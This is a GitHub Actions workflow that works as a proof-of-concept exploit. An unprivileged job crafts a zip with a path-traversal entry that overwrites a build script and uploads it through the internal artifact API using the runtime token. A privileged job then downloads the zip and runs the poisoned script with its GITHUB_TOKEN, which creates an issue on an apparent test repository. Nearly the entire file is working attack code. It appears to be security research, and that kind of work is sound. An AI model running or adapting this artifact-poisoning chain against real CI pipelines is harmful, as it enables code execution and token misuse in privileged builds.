name: artifact-privilege2
on: workflow_dispatch
jobs:
  untrusted_producer:
    runs-on: ubuntu-latest
    permissions: {}
    steps:
      - name: prove this job is UNPRIVILEGED - no secret referenced anywhere
        run: |
          code=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/antonade/gh-probe-pub/issues \
            -d '{"title":"producer attempt","body":"from untrusted producer"}')
          echo "PRODUCER create_issue_http=$code"
      - name: craft artifact overwriting the consumer's build script
        run: |
          python3 - <<'EOF'
          import zipfile
          payload = ('#!/bin/bash\n'
                     'echo "PWNED_IN_PRIVILEGED_JOB"\n'
                     'code=$(curl -s -o /tmp/r.json -w "%{http_code}" -X POST '
                     '-H "Authorization: Bearer $GITHUB_TOKEN" '
                     '-H "Accept: application/vnd.github+json" '
                     'https://api.github.com/repos/antonade/gh-probe-pub/issues '
                     '-d \'{"title":"INJECTED_BY_UNTRUSTED_ARTIFACT","body":"created by code injected via artifact"}\')\n'
                     'echo "INJECTED_CODE_create_issue_http=$code"\n'
                     'grep -o \'"number\": *[0-9]*\' /tmp/r.json | head -1\n')
          z=zipfile.ZipFile('/tmp/p2.zip','w',zipfile.ZIP_DEFLATED)
          z.writestr('readme.txt','benign\n')
          z.writestr('a/../../build.sh', payload)
          z.close()
          EOF
      - uses: actions/github-script@v7
        with:
          script: |
            const fs=require('fs'), crypto=require('crypto');
            const tok=process.env.ACTIONS_RUNTIME_TOKEN, base=process.env.ACTIONS_RESULTS_URL;
            const cl=JSON.parse(Buffer.from(tok.split('.')[1],'base64').toString());
            const m=(cl.scp||"").match(/Actions\.Results:([0-9a-f-]+):([0-9a-f-]+)/i);
            const ids={workflow_run_backend_id:m[1], workflow_job_run_backend_id:m[2]};
            const c=await (await fetch(base+"twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact",
              {method:"POST",headers:{"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
               body:JSON.stringify({...ids,name:"buildinput2",version:4})})).json();
            const data=fs.readFileSync('/tmp/p2.zip'); const blk=Buffer.from("b1").toString('base64');
            await fetch(c.signed_upload_url+"&comp=block&blockid="+blk,{method:"PUT",headers:{"x-ms-blob-type":"BlockBlob"},body:data});
            await fetch(c.signed_upload_url+"&comp=blocklist",{method:"PUT",headers:{"Content-Type":"application/xml"},
              body:'<?xml version="1.0" encoding="utf-8"?><BlockList><Latest>'+blk+'</Latest></BlockList>'});
            const sha=crypto.createHash('sha256').update(data).digest('hex');
            core.info("FINALIZE="+(await fetch(base+"twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact",
              {method:"POST",headers:{"Authorization":"Bearer "+tok,"Content-Type":"application/json"},
               body:JSON.stringify({...ids,name:"buildinput2",size:data.length,hash:"sha256:"+sha})})).status);
  privileged_consumer:
    needs: untrusted_producer
    runs-on: ubuntu-latest
    permissions:
      issues: write
      contents: write
    steps:
      - name: set up a normal CI build script
        run: |
          mkdir -p /home/runner/work/tgt/dl
          printf '#!/bin/bash\necho "ORIGINAL_BUILD_SCRIPT_RAN"\n' > /home/runner/work/tgt/build.sh
          chmod +x /home/runner/work/tgt/build.sh
          echo "CONSUMER build_sha_before=$(sha256sum /home/runner/work/tgt/build.sh | cut -c1-16)"
      - uses: actions/download-artifact@v4
        with:
          name: buildinput2
          path: /home/runner/work/tgt/dl
      - name: run the build script, as CI normally would
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "CONSUMER build_sha_after=$(sha256sum /home/runner/work/tgt/build.sh | cut -c1-16)"
          bash /home/runner/work/tgt/build.sh
